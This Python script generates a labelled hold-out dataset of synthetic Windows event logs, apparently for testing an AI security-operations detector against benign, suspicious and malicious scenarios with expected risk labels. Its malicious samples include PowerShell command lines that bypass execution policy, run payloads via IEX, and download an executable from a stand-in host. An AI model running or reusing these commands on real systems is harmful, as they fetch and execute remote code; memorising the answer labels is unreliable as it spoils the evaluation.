import json
from pathlib import Path


BASE_DIR = Path(__file__).resolve().parent.parent
OUTPUT_FILE = BASE_DIR / "data" / "holdout_scenarios.json"


def event(
    timestamp,
    event_id,
    event_type,
    source="WS-HOLDOUT",
    username=None,
    source_ip=None,
    destination_ip=None,
    process=None,
    command_line=None,
    message=None,
):
    return {
        "timestamp": timestamp,
        "event_id": event_id,
        "event_type": event_type,
        "source": source,
        "username": username,
        "source_ip": source_ip,
        "destination_ip": destination_ip,
        "process": process,
        "command_line": command_line,
        "message": message,
    }


def create_holdout_scenarios():

    scenarios = []

    # =========================================================
    # BENIGN - NEW ADMINISTRATIVE POWERSHELL VARIATIONS
    # =========================================================

    benign_commands = [
        "Get-EventLog -LogName System -Newest 10",
        "Get-Service | Where-Object {$_.Status -eq 'Running'}",
        "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5",
        "Get-CimInstance Win32_OperatingSystem",
        "Get-ChildItem C:\\ProgramData",
    ]

    for index, command in enumerate(
        benign_commands,
        start=1,
    ):

        scenarios.append(
            {
                "scenario_id": f"HB{index:02d}",
                "name": "Unseen Legitimate PowerShell",
                "ground_truth": "BENIGN",
                "expected_attack": False,
                "expected_techniques": [],
                "expected_risk": "LOW",
                "events": [
                    event(
                        f"2026-09-10T09:{index:02d}:00Z",
                        4688,
                        "Process Creation",
                        source="WS-HR",
                        username="administrator",
                        source_ip="10.20.10.10",
                        process="powershell.exe",
                        command_line=(
                            "powershell.exe "
                            "-NoProfile "
                            f"-Command {command}"
                        ),
                        message="Legitimate system administration",
                    )
                ],
            }
        )

    # =========================================================
    # BENIGN - NORMAL USER ACTIVITY
    # =========================================================

    for index in range(6, 11):

        scenarios.append(
            {
                "scenario_id": f"HB{index:02d}",
                "name": "Unseen Normal Authentication",
                "ground_truth": "BENIGN",
                "expected_attack": False,
                "expected_techniques": [],
                "expected_risk": "LOW",
                "events": [
                    event(
                        f"2026-09-10T10:{index:02d}:00Z",
                        4624,
                        "Successful Login",
                        source="WS-FINANCE",
                        username=f"employee{index}",
                        source_ip="10.20.10.20",
                        message="Normal successful authentication",
                    )
                ],
            }
        )

    # =========================================================
    # BENIGN WITH NOISE
    # =========================================================

    for index in range(1, 6):

        scenarios.append(
            {
                "scenario_id": f"HN{index:02d}",
                "name": "Unseen Benign Security Noise",
                "ground_truth": "BENIGN_WITH_NOISE",
                "expected_attack": False,
                "expected_techniques": [],
                "expected_risk": "LOW",
                "events": [

                    event(
                        "2026-09-10T11:00:00Z",
                        4624,
                        "Successful Login",
                        source="WS-OFFICE",
                        username="employee",
                        source_ip="10.20.10.30",
                        message="Successful authentication",
                    ),

                    event(
                        "2026-09-10T11:01:00Z",
                        4688,
                        "Process Creation",
                        source="WS-OFFICE",
                        username="employee",
                        source_ip="10.20.10.30",
                        process="explorer.exe",
                        command_line="explorer.exe",
                        message="Normal desktop activity",
                    ),

                    event(
                        "2026-09-10T11:02:00Z",
                        4688,
                        "Process Creation",
                        source="WS-OFFICE",
                        username="employee",
                        source_ip="10.20.10.30",
                        process="cmd.exe",
                        command_line="cmd.exe /c ipconfig",
                        message="Routine network troubleshooting",
                    ),
                ],
            }
        )

    # =========================================================
    # MALICIOUS - NEW POWERSHELL VARIATIONS
    # =========================================================

    malicious_commands = [
        "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX $env:PAYLOAD",
        "powershell.exe -Command [System.Convert]::FromBase64String($x)",
        "powershell.exe -Command Invoke-Expression $command",
        "powershell.exe -Command (New-Object Net.WebClient).DownloadFile('http://malicious-example.test/a.exe','C:\\Temp\\a.exe')",
        "powershell.exe -WindowStyle Hidden -Command Invoke-WebRequest http://malicious-example.test/update",
    ]

    for index, command in enumerate(
        malicious_commands,
        start=1,
    ):

        scenarios.append(
            {
                "scenario_id": f"HM{index:02d}",
                "name": "Unseen Malicious PowerShell",
                "ground_truth": "MALICIOUS",
                "expected_attack": True,
                "expected_techniques": [
                    "T1059.001"
                ],
                "expected_risk": "HIGH",
                "events": [
                    event(
                        f"2026-09-10T12:{index:02d}:00Z",
                        4688,
                        "Process Creation",
                        source="WS-VICTIM",
                        username="user1",
                        source_ip="10.20.10.40",
                        process="powershell.exe",
                        command_line=command,
                        message="Potential malicious PowerShell activity",
                    )
                ],
            }
        )

    # =========================================================
    # MALICIOUS - BRUTE FORCE VARIATIONS
    # =========================================================

    for index in range(1, 6):

        failed_events = []

        for attempt in range(5):

            failed_events.append(
                event(
                    f"2026-09-10T13:0{attempt}:00Z",
                    4625,
                    "Failed Login",
                    source="SRV-AUTH",
                    username=f"admin{index}",
                    source_ip=f"10.20.20.{50 + index}",
                    message="Repeated authentication failure",
                )
            )

        scenarios.append(
            {
                "scenario_id": f"HF{index:02d}",
                "name": "Unseen Brute Force Attack",
                "ground_truth": "MALICIOUS",
                "expected_attack": True,
                "expected_techniques": [
                    "T1110"
                ],
                "expected_risk": "HIGH",
                "events": failed_events,
            }
        )

    # =========================================================
    # SUSPICIOUS - ISOLATED DISCOVERY
    # =========================================================

    discovery_commands = [
        "cmd.exe /c whoami /all",
        "cmd.exe /c net user",
        "cmd.exe /c systeminfo",
        "cmd.exe /c tasklist /v",
        "cmd.exe /c ipconfig /all",
    ]

    for index, command in enumerate(
        discovery_commands,
        start=1,
    ):

        scenarios.append(
            {
                "scenario_id": f"HS{index:02d}",
                "name": "Unseen Isolated Discovery",
                "ground_truth": "SUSPICIOUS",
                "expected_attack": False,
                "expected_techniques": [
                    "T1033"
                ],
                "expected_risk": "LOW",
                "events": [
                    event(
                        f"2026-09-10T14:{index:02d}:00Z",
                        4688,
                        "Process Creation",
                        source="WS-RESEARCH",
                        username="analyst",
                        source_ip="10.20.30.10",
                        process="cmd.exe",
                        command_line=command,
                        message="Isolated discovery activity",
                    )
                ],
            }
        )

    # =========================================================
    # SUSPICIOUS - EXTERNAL NETWORK
    # =========================================================

    destinations = [
        "203.0.113.75",
        "198.51.100.45",
        "203.0.113.120",
        "198.51.100.90",
        "185.199.108.200",
    ]

    for index, destination in enumerate(
        destinations,
        start=1,
    ):

        scenarios.append(
            {
                "scenario_id": f"HE{index:02d}",
                "name": "Unseen External Communication",
                "ground_truth": "SUSPICIOUS",
                "expected_attack": False,
                "expected_techniques": [
                    "T1071"
                ],
                "expected_risk": "LOW",
                "events": [
                    event(
                        f"2026-09-10T15:{index:02d}:00Z",
                        5156,
                        "Network Connection",
                        source="WS-NET",
                        username="user2",
                        source_ip="10.20.30.20",
                        destination_ip=destination,
                        message="External network communication",
                    )
                ],
            }
        )

    # =========================================================
    # MALICIOUS - CORRELATED DISCOVERY ATTACK
    # =========================================================

    for index in range(1, 6):

        scenarios.append(
            {
                "scenario_id": f"HC{index:02d}",
                "name": "Unseen Correlated Discovery Attack",
                "ground_truth": "MALICIOUS",
                "expected_attack": True,
                "expected_techniques": [
                    "T1059.001",
                    "T1033",
                    "T1071",
                ],
                "expected_risk": "HIGH",
                "events": [

                    event(
                        "2026-09-10T16:00:00Z",
                        4688,
                        "Process Creation",
                        source="WS-COMPROMISED",
                        username="attacker_user",
                        source_ip="10.20.40.10",
                        process="powershell.exe",
                        command_line=(
                            "powershell.exe "
                            "-ExecutionPolicy Bypass "
                            "-Command IEX $payload"
                        ),
                        message="Suspicious PowerShell execution",
                    ),

                    event(
                        "2026-09-10T16:01:00Z",
                        4688,
                        "Process Creation",
                        source="WS-COMPROMISED",
                        username="attacker_user",
                        source_ip="10.20.40.10",
                        process="cmd.exe",
                        command_line="cmd.exe /c whoami /all",
                        message="Account discovery",
                    ),

                    event(
                        "2026-09-10T16:02:00Z",
                        5156,
                        "Network Connection",
                        source="WS-COMPROMISED",
                        username="attacker_user",
                        source_ip="10.20.40.10",
                        destination_ip="198.51.100.25",
                        message="External communication",
                    ),
                ],
            }
        )

    # =========================================================
    # MALICIOUS - FULL ATTACK CHAIN
    # =========================================================

    for index in range(1, 6):

        scenarios.append(
            {
                "scenario_id": f"HA{index:02d}",
                "name": "Unseen Full Attack Chain",
                "ground_truth": "MALICIOUS",
                "expected_attack": True,
                "expected_techniques": [
                    "T1059.001",
                    "T1033",
                    "T1110",
                    "T1071",
                ],
                "expected_risk": "CRITICAL",
                "events": [

                    event(
                        "2026-09-10T17:00:00Z",
                        4688,
                        "Process Creation",
                        source="WS-TARGET",
                        username="compromised_user",
                        source_ip="10.20.50.10",
                        process="powershell.exe",
                        command_line=(
                            "powershell.exe "
                            "-EncodedCommand "
                            "SQBFAFgA"
                        ),
                        message="Encoded PowerShell",
                    ),

                    event(
                        "2026-09-10T17:01:00Z",
                        4688,
                        "Process Creation",
                        source="WS-TARGET",
                        username="compromised_user",
                        source_ip="10.20.50.10",
                        process="cmd.exe",
                        command_line="cmd.exe /c whoami /all",
                        message="Discovery activity",
                    ),

                    event(
                        "2026-09-10T17:02:00Z",
                        4625,
                        "Failed Login",
                        source="SRV-AUTH",
                        username="administrator",
                        source_ip="10.20.50.99",
                        message="Authentication attack",
                    ),

                    event(
                        "2026-09-10T17:03:00Z",
                        5156,
                        "Network Connection",
                        source="WS-TARGET",
                        username="compromised_user",
                        source_ip="10.20.50.10",
                        destination_ip="203.0.113.75",
                        message="External communication",
                    ),
                ],
            }
        )

    return scenarios


if __name__ == "__main__":

    scenarios = create_holdout_scenarios()

    OUTPUT_FILE.parent.mkdir(
        parents=True,
        exist_ok=True,
    )

    with open(
        OUTPUT_FILE,
        "w",
        encoding="utf-8",
    ) as file:

        json.dump(
            scenarios,
            file,
            indent=2,
        )

    counts = {}

    for scenario in scenarios:

        label = scenario["ground_truth"]

        counts[label] = (
            counts.get(label, 0) + 1
        )

    print("=" * 70)
    print(
        "AGENTIC AI-SOC - UNSEEN HOLD-OUT DATASET"
    )
    print("=" * 70)

    print(
        f"Total scenarios : {len(scenarios)}"
    )

    for label, count in counts.items():

        print(
            f"{label:<22}: {count}"
        )

    print()
    print(
        "Dataset saved to:"
    )
    print(
        OUTPUT_FILE
    )

    print("=" * 70)